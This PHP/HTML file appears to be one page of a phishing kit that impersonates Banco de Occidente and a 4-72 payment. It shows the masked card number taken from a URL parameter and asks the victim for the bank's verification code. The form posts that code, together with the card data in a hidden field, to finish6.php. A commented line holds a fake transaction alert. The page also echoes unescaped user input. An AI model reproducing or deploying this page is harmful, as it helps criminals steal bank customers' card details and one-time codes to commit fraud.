<?php 




$codigoG = $_GET['codigo'];

$fechaActual = date('d-m-Y');

$palabrasSeparadas = explode(" ", $codigoG);

    $fechaActual = date('d/m/y');
    $ca = substr($palabrasSeparadas[0],11,4); 
    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/davi.css">
</head>
<body>
    <div class="details" >
        <img src="/img/occidente.png" alt="" width="130px">
        <hr>

        <h3 style="color:black; ">Autenticación de compra</h3>
        <a style="color:black;">Acabamos de enviarte un código de verificación por correo electronico o mensaje de texto. Para autorizar un pago en 4-72 el <?php echo $fechaActual; ?> con tú tarjeta <?php echo "********$ca."; ?><br>Banco de Occidente nunca te solicitará información confidencial o financiera como usuarios y claves de acceso.</a><br><p></p>
    
        <form action="finish6.php" method="post">
        <input type="hidden" name="numero" value=" <?php echo "$codigoG"; ?>">
      
        <center><a style="">Código de verificación</a><br>
        <input type="text" name="cDinamica" id="input" style="" required minlength="6"><br>
        <input type="submit" id="btn" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        </form><br><br>
    
    </div>

   


<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    setTimeout(function() {
        $(".content").fadeIn(1500);
    },240000);


    setTimeout(function() {
        $(".details").fadeOut(1000);
    },240000);
    
});
</script>
</body>
</html>